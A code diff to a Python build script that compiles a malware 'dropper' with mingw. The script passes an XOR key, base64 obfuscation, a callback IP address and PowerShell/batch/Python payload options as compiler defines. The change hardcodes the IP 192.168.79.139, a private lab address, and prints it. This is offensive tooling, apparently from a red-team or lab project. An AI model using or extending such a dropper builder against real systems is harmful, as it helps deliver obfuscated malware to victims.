@@ -98,8 +98,7 @@ def parse_args() -> Args:
 # converts the release/debug and x86/x64 into a PE executable with mingw.
 def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configuration_bool: bool, arch: int, xor_key: int, base64: bool, output_file: str, dict_ext: dict[str, bool], test_output: bool) -> int:
 
-	hostname: str = socket.gethostname()
-	ip: str = socket.gethostbyname(hostname)
+	ip: str = "192.168.79.139"
 
 	if (base64 == True):
 		base64_integer = 1
@@ -122,7 +121,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 
 	print(f"This is your mingw_version: {mingw_version!s}")
 	print(f"This is your dropper write: {dropper_write!s}")
-
+	print(f"This is your ip: {ip!s}")
 	if (configuration_bool == True):
 		success = subprocess.run([
 		mingw_version,
@@ -161,7 +160,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 		f'-DDROPPER_OUTPUT="{dropper_write}"',
 		f"-DDROPPER_XOR_KEY={xor_key!s}",
 		f"-DDROPPER_BASE64={base64_integer!s}",
-        f'-DIPADDR="{ip}"',
+	        f'-DIPADDR="{ip}"',
 		f"-DPOWERSHELL={dict_ext['powershell']}",
 		f"-DBATCH={dict_ext['batch']}",
 		f"-DPYTHON={dict_ext['python']}",
